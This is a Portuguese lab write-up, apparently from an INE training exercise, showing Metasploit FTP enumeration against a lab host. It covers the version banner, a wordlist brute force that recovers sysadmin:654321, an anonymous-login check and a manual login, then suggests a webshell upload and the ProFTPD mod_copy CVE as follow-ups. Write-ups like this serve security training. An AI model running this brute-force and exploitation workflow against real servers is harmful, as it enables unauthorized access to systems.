# 🧪 Lab Report — FTP Enumeration com Metasploit

> **Plataforma:** INE
> **Tema central:** Enumeração de versão FTP → Brute force de credenciais → Validação de acesso anônimo → Login autenticado
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Identificar a versão do serviço FTP, descobrir credenciais válidas via brute force e validar o acesso ao servidor usando os dados coletados.

---

## 📋 Sumário de Etapas

| # | Etapa | Módulo / Comando | Resultado |
|---|-------|-----------------|-----------|
| 1 | Conectividade | `ping` | Alvo acessível |
| 2 | Versão do FTP | `auxiliary/scanner/ftp/ftp_version` | ProFTPD 1.3.5a |
| 3 | Brute force | `auxiliary/scanner/ftp/ftp_login` | `sysadmin:654321` |
| 4 | Login anônimo | `auxiliary/scanner/ftp/anonymous` | Desabilitado |
| 5 | Login autenticado | `ftp demo.ine.local` | Acesso confirmado |

---

## 🔬 Execução Passo a Passo

### Step 1 — Verificar Conectividade

```bash
ping -c 4 demo.ine.local
```

**Por quê:** Confirmar que o alvo responde antes de qualquer scan. Evita perder tempo configurando módulos para um host que não existe ou está offline.

**Resultado:** 4 pacotes enviados, 0% perda — alvo acessível.

---

### Step 2 — Identificar a Versão do Serviço FTP

```bash
msfconsole

use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```

**Por quê identificar a versão primeiro:**
Versão = vetor. Saber que é `ProFTPD 1.3.5a` permite:
- Buscar CVEs específicos (`search ProFTPD 1.3.5`)
- Confirmar se é alvo viável antes de gastar tempo em brute force
- Entender o comportamento esperado do servidor

**Resultado:**
```
[+] demo.ine.local - FTP Banner: 220 ProFTPD 1.3.5a Server
```

> 💡 ProFTPD 1.3.5 tem vulnerabilidades conhecidas, incluindo o módulo `mod_copy` que permite cópia de arquivos sem autenticação (CVE-2015-3306). Sempre checar a versão exata.

---

### Step 3 — Brute Force de Credenciais

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

**Por quê cada parâmetro:**

| Parâmetro | Valor | Motivo |
|-----------|-------|--------|
| `RHOSTS` | `demo.ine.local` | Alvo do ataque |
| `USER_FILE` | `common_users.txt` | Wordlist de usuários comuns em sistemas Unix |
| `PASS_FILE` | `unix_passwords.txt` | Wordlist de senhas comuns em sistemas Unix |

**Como o módulo funciona:** Tenta cada combinação usuário:senha fazendo login real no FTP. Se o servidor responder com código `230` (Login successful), registra a credencial como válida.

**Resultado:**
```
[+] demo.ine.local - Login Successful: sysadmin:654321
```

> ⚠️ Brute force gera muitos logs no servidor alvo. Em ambientes reais, isso aciona alertas de IDS/IPS. Usar `set VERBOSE false` para reduzir output local, mas o ruído no alvo continua.

---

### Step 4 — Verificar Login Anônimo

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

**Por quê checar anonymous:** FTP anônimo é uma misconfiguration clássica — permite login com usuário `anonymous` e qualquer senha (geralmente um email). Ainda existe em servidores legados e mal configurados.

Se habilitado, você consegue listar e potencialmente baixar arquivos **sem nenhuma credencial**.

**Resultado:**
```
[-] demo.ine.local - Anonymous READ disabled
```

Login anônimo desabilitado — precisamos das credenciais obtidas no brute force.

---

### Step 5 — Login Autenticado no FTP

```bash
# Sair do msfconsole
exit

# Conectar via cliente FTP nativo
ftp demo.ine.local
```

Quando solicitado:
```
Name: sysadmin
Password: 654321
```

**Por quê usar o cliente FTP nativo:** O Metasploit confirmou as credenciais, mas para interagir com o servidor (listar arquivos, baixar, navegar) o cliente FTP interativo é mais prático do que um módulo auxiliar.

**Comandos úteis dentro do FTP:**
```bash
ls          # listar arquivos
pwd         # diretório atual
cd pasta    # navegar
get arquivo # baixar arquivo
put arquivo # enviar arquivo
binary      # modo binário (para arquivos não-texto)
bye         # encerrar sessão
```

**Resultado:** Autenticação bem-sucedida — sessão FTP aberta como `sysadmin`.

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Serviço | FTP |
| Versão | ProFTPD 1.3.5a |
| Login anônimo | ❌ Desabilitado |
| Credencial válida | `sysadmin : 654321` |
| Acesso confirmado | ✅ |

---

## 🧠 Conceitos Consolidados

### Enumeração de Versão Antes de Atacar
Identificar a versão do serviço não é opcional — é o que separa ataque orientado a dados de tentativa aleatória. `ProFTPD 1.3.5a` direciona a busca por exploits específicos, em vez de tentar tudo.

### Wordlists do Metasploit
O Metasploit vem com wordlists prontas em `/usr/share/metasploit-framework/data/wordlists/`. Para ambientes reais, wordlists maiores como as do SecLists são mais eficazes. Para labs com senhas intencionalmente fracas, as padrão geralmente bastam.

### FTP Anônimo — Por Que Verificar Sempre
É rápido, não deixa rastro de credencial comprometida, e ainda existe em servidores legados. Vale os 5 segundos de verificação antes de partir para brute force.

### Código de Resposta FTP
| Código | Significado |
|--------|-------------|
| `220` | Servidor pronto (banner) |
| `230` | Login bem-sucedido |
| `530` | Login falhou |
| `331` | Usuário aceito, aguarda senha |

---

## 🔁 Próximos Passos Lógicos

Com acesso FTP autenticado como `sysadmin`:

```
ls / get  →  listar e baixar arquivos disponíveis
put       →  testar permissão de escrita
              se write habilitado → upload de webshell (se HTTP também estiver aberto)
CVE-2015-3306  →  ProFTPD 1.3.5 mod_copy → copiar arquivos sem auth
```

---

## 📌 Relacionados

- [[Metasploit — Fundamentos e Arquitetura]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Nmap — Service & OS Detection]]
- [[Cheatsheet — Portas Importantes]]

#lab #exploração #ferramenta/metasploit #protocolo/ftp
